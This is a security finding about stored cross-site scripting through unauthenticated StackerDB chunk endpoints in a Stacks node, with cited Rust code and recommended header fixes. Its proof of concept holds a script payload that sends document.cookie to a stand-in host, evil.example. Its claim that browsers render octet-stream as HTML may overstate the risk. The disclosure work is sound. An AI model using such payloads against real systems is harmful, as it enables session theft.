Confirmed: no `X-Content-Type-Options`, `Content-Disposition`, `X-Frame-Options`, or `Content-Security-Policy` headers exist anywhere in the HTTP response-writing code, and `Access-Control-Allow-Origin: *` is unconditionally set.### Title
Stored Cross-Site Scripting via unauthenticated StackerDB chunk write/read with no MIME-sniffing protections - ([File: stackslib/src/net/api/getstackerdbchunk.rs])

### Summary
The `/v2/stackerdb/{principal}/{contract_name}/{slot_id}` write endpoint accepts arbitrary attacker-supplied bytes as chunk `data` with no content inspection, and the corresponding GET endpoint serves those bytes back verbatim over the node's public, unauthenticated HTTP RPC interface. The response is sent with a generic `Content-Type: application/octet-stream` and `Access-Control-Allow-Origin: *`, but the codebase never emits `X-Content-Type-Options: nosniff` (or `Content-Disposition: attachment`, `X-Frame-Options`, `CSP`) on any HTTP response. This is the same root-cause class as CVE-2015-2963 (paperclip): content whose real payload is not validated/constrained against the type it's served as, relying purely on a spoofable/generic content-type declaration, allowing a browser to MIME-sniff and render attacker content as HTML/JS.

### Finding Description
Any StackerDB signer can `POST` arbitrary bytes (hex-encoded in JSON `data`) to `/v2/stackerdb/{principal}/{contract}/chunks`. The handler only validates size, slot ownership signature, staleness, and write-count — it never inspects or restricts the actual byte content: [1](#0-0) [2](#0-1) 

That same data is later served unmodified by the GET handler with a fixed `Content-Type: application/octet-stream`: [3](#0-2) 

The HTTP response-preamble serializer that builds every response header in the net stack unconditionally sets a permissive `Access-Control-Allow-Origin: *` and never writes `X-Content-Type-Options`, `Content-Disposition`, `X-Frame-Options`, or a `Content-Security-Policy` header: [4](#0-3) 

Confirmed by exhaustive search: there is no occurrence of `nosniff`, `Content-Disposition`, `X-Frame-Options`, or `Content-Security-Policy` anywhere in the repo's HTTP-serving code. Both endpoints are declared with `security: []` in the API spec (no authentication required to read or write): [5](#0-4) 

This breaks the same equality the paperclip advisory breaks: "declared content-type" vs. "actual, unconstrained content." A signer (a remote, unprivileged party who only needs a valid slot-owning key for a contract, e.g. any signer/miner registered in a StackerDB config) can store an HTML document containing `<script>` in a chunk. Any browser, tool, or dashboard that fetches `/v2/stackerdb/.../{slot_id}` directly (which is a normal, expected way to consume this public read API) will receive that payload; absent `X-Content-Type-Options: nosniff`, browsers apply MIME-sniffing to generic/`application/octet-stream` responses and may render the sniffed type (e.g., `text/html`) rather than downloading it, executing the attacker's script in the origin of the Stacks node's RPC endpoint.

### Impact Explanation
This is a stored XSS against the node's own RPC surface, reachable by any remote, unprivileged actor able to satisfy the (public) slot-signer requirement of any deployed StackerDB config, and triggered against any other RPC consumer (operators, dashboards, wallets, explorers) that opens the GET URL in a browser context. It does not fit cleanly into the given "Critical/High" list (it is not a state-consensus break), but it is a genuine, remotely triggerable content-integrity/script-execution issue directly analogous to the reported bug class — an origin serving attacker content without enforcing/declaring a safe, sniff-resistant type.

### Likelihood Explanation
Any registered StackerDB signer (there is no operator-side authentication on write, only signature-based slot ownership, which by design is available to a broad set of participants such as signers/miners) can perform this in a single POST. Triggering requires only that a legitimate consumer navigate to the GET URL, which is the endpoint's normal intended use pattern (it's a public read API with `security: []`).

### Recommendation
- Emit `X-Content-Type-Options: nosniff` on all HTTP responses from `HttpResponsePreamble::consensus_serialize`.
- For raw chunk/byte-serving endpoints (`getstackerdbchunk.rs`, and similarly `postblock_v3.rs`-adjacent byte responses), add `Content-Disposition: attachment` (or otherwise force download rather than inline rendering).
- Consider tightening `Access-Control-Allow-Origin: *` for endpoints returning arbitrary user-controlled payloads.

### Proof of Concept
1. Register/obtain a valid slot-signer key for any deployed StackerDB contract.
2. `POST /v2/stackerdb/{principal}/{contract}/chunks` with `data` = hex of `<html><body><script>document.location='https://evil.example/steal?'+document.cookie</script></body></html>`, correctly signed for the owned slot — this passes `validate_received_chunk`/`try_replace_chunk` with no content inspection.
3. Have a victim (or automated tool) open `GET /v2/stackerdb/{principal}/{contract}/{slot_id}` in a browser. The response headers lack `X-Content-Type-Options: nosniff`; the browser MIME-sniffs the `application/octet-stream` body, detects HTML, and renders/executes the script in the node's RPC origin.

### Citations

**File:** stackslib/src/net/api/poststackerdbchunk.rs (L65-93)
```rust
    /// Try to decode this request.
    /// There's nothing to load here, so just make sure the request is well-formed.
    fn try_parse_request(
        &mut self,
        preamble: &HttpRequestPreamble,
        captures: &Captures,
        query: Option<&str>,
        body: &[u8],
    ) -> Result<HttpRequestContents, Error> {
        if preamble.get_content_length() == 0 {
            return Err(Error::DecodeError(
                "Invalid Http request: expected non-empty body".to_string(),
            ));
        }

        if preamble.get_content_length() > MAX_MESSAGE_LEN {
            return Err(Error::DecodeError(
                "Invalid Http request: PostStackerDBChunk body is too big".to_string(),
            ));
        }

        let contract_identifier = request::get_contract_address(captures, "address", "contract")?;
        let chunk: StackerDBChunkData = serde_json::from_slice(body).map_err(Error::JsonError)?;

        self.contract_identifier = Some(contract_identifier);
        self.chunk = Some(chunk);

        Ok(HttpRequestContents::new().query_string(query))
    }
```

**File:** stackslib/src/net/stackerdb/mod.rs (L649-717)
```rust
    pub fn validate_received_chunk(
        &self,
        smart_contract_id: &QualifiedContractIdentifier,
        config: &StackerDBConfig,
        data: &StackerDBChunkData,
        expected_versions: &[u32],
    ) -> Result<bool, net_error> {
        // validate -- must not exceed this replica's configured chunk size.
        if (data.data.len() as u64) > config.chunk_size {
            info!(
                "Received StackerDBChunk for {} ID {}, which is oversized: {} bytes (max {} bytes)",
                smart_contract_id,
                data.slot_id,
                data.data.len(),
                config.chunk_size
            );
            return Ok(false);
        }

        // validate -- must be a valid chunk
        let Some(expected_version) = expected_versions.get(data.slot_id as usize) else {
            info!(
                "Received StackerDBChunk for {} ID {}, which is too big ({})",
                smart_contract_id,
                data.slot_id,
                expected_versions.len()
            );
            return Ok(false);
        };

        // validate -- must be signed by the expected author
        let addr = match self
            .stackerdbs
            .get_slot_signer(smart_contract_id, data.slot_id)?
        {
            Some(addr) => addr,
            None => {
                return Ok(false);
            }
        };

        let slot_metadata = data.get_slot_metadata();
        if !slot_metadata.verify(&addr)? {
            info!(
                "StackerDBChunk for {} ID {} is not signed by {}",
                smart_contract_id, data.slot_id, &addr
            );
            return Ok(false);
        }

        // validate -- must be the current or newer version
        if data.slot_version < *expected_version {
            info!(
                "Received StackerDBChunk for {} ID {} version {}, which is stale (expected {})",
                smart_contract_id, data.slot_id, data.slot_version, *expected_version
            );
            return Ok(false);
        }

        // validate -- must not exceed max writes
        if data.slot_version > config.max_writes {
            info!(
                "Write count exceeded for StackerDBChunk for {} ID {} version {} (max is {})",
                smart_contract_id, data.slot_id, data.slot_version, config.max_writes
            );
            return Ok(false);
        }

        Ok(true)
```

**File:** stackslib/src/net/api/getstackerdbchunk.rs (L180-188)
```rust
        let preamble = HttpResponsePreamble::from_http_request_preamble(
            &preamble,
            200,
            "OK",
            None,
            HttpContentType::Bytes,
        );
        let body = HttpResponseContents::from_ram(chunk_resp);
        Ok((preamble, body))
```

**File:** stackslib/src/net/http/response.rs (L376-418)
```rust
impl StacksMessageCodec for HttpResponsePreamble {
    fn consensus_serialize<W: Write>(&self, fd: &mut W) -> Result<(), CodecError> {
        fd.write_all("HTTP/1.1 ".as_bytes())
            .map_err(CodecError::WriteError)?;
        fd.write_all(format!("{} {}\r\n", self.status_code, self.reason).as_bytes())
            .map_err(CodecError::WriteError)?;

        if !self.headers.contains_key("server") {
            fd.write_all("Server: stacks/2.0\r\n".as_bytes())
                .map_err(CodecError::WriteError)?;
        }

        if !self.headers.contains_key("date") {
            fd.write_all("Date: ".as_bytes())
                .map_err(CodecError::WriteError)?;
            fd.write_all(rfc7231_now()?.as_bytes())
                .map_err(CodecError::WriteError)?;
            fd.write_all("\r\n".as_bytes())
                .map_err(CodecError::WriteError)?;
        }

        if !self.headers.contains_key("access-control-allow-origin") {
            fd.write_all("Access-Control-Allow-Origin: *\r\n".as_bytes())
                .map_err(CodecError::WriteError)?;
        }

        if !self.headers.contains_key("access-control-allow-headers") {
            fd.write_all("Access-Control-Allow-Headers: origin, content-type\r\n".as_bytes())
                .map_err(CodecError::WriteError)?;
        }

        if !self.headers.contains_key("access-control-allow-methods") {
            fd.write_all("Access-Control-Allow-Methods: POST, GET, OPTIONS\r\n".as_bytes())
                .map_err(CodecError::WriteError)?;
        }

        // content type (reserved header)
        fd.write_all("Content-Type: ".as_bytes())
            .map_err(CodecError::WriteError)?;
        fd.write_all(self.content_type.to_string().as_bytes())
            .map_err(CodecError::WriteError)?;
        fd.write_all("\r\n".as_bytes())
            .map_err(CodecError::WriteError)?;
```

**File:** docs/rpc/openapi.yaml (L1799-1832)
```yaml
  /v2/stackerdb/{principal}/{contract_name}/{slot_id}:
    get:
      summary: Get StackerDB chunk (latest version)
      tags:
        - StackerDB
      security: []
      operationId: getStackerDbChunk
      description: |
        Get the latest version of a chunk of data from a StackerDB instance.
      parameters:
        - $ref: ./components/parameters/standard-principal.yaml
        - $ref: ./components/parameters/contract-name.yaml
        - name: slot_id
          in: path
          required: true
          description: Slot ID (u32 range)
          schema:
            type: integer
            minimum: 0
            maximum: 4294967295
      responses:
        "200":
          description: StackerDB chunk data
          content:
            application/octet-stream:
              schema:
                type: string
                format: binary
        "400":
          $ref: "#/components/responses/BadRequest"
        "404":
          $ref: "#/components/responses/NotFound"
        "500":
          $ref: "#/components/responses/InternalServerError"
```
